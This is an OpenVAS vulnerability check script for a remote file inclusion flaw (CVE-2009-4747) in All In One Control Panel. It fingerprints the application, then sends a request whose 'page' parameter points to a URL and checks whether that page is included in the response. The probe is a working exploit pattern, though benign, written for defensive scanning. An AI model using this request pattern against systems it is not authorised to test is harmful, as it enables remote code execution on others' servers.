###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aiocp_remote_file_inclusion.nasl 14 2013-10-27 12:33:37Z jan $
#
# AIOCP 'cp_html2xhtmlbasic.php' Remote File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary code in
  the context of an application.
  Impact Level: Application";
tag_affected = "All In One Control Panel (AIOCP) 1.4.001 and prior";
tag_insight = "The flaw is caused by improper validation of user-supplied input via the
  'page' parameter in cp_html2xhtmlbasic.php that allows the attackers to
  execute arbitrary code on the web server.";
tag_solution = "No solution or patch is available as of 2nd April, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/aiocp/";
tag_summary = "This host is running All In One Control Panel (AIOCP) and is prone
  to remote file inclusion vulnerability.";

if(description)
{
  script_id(801201);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-04-07 16:20:50 +0200 (Wed, 07 Apr 2010)");
  script_cve_id("CVE-2009-4747");
  script_bugtraq_id(36609);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("AIOCP 'cp_html2xhtmlbasic.php' Remote File Inclusion Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/53679");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/507030/100/0/threaded");

  script_description(desc);
  script_summary("Check if AIOCP is vulnerable to remote file inclusion");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

foreach dir (make_list("/", "/AIOCP", "/aiocp", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/public/code/cp_dpage.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application
  if('Powered by Tecnick.com AIOCP' >< res)
  {
    ## Construct attack request
    req = http_get(item:string(dir,"/public/code/cp_html2xhtmlbasic.php?page=",
    "http://",get_host_ip(),dir,"/public/code/cp_contact_us.php"), port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if((">Contact us<" >< res) && (">name<" >< res) && (">email<" >< res))
    {
      security_hole(port);
      exit(0);
    }
  }
}
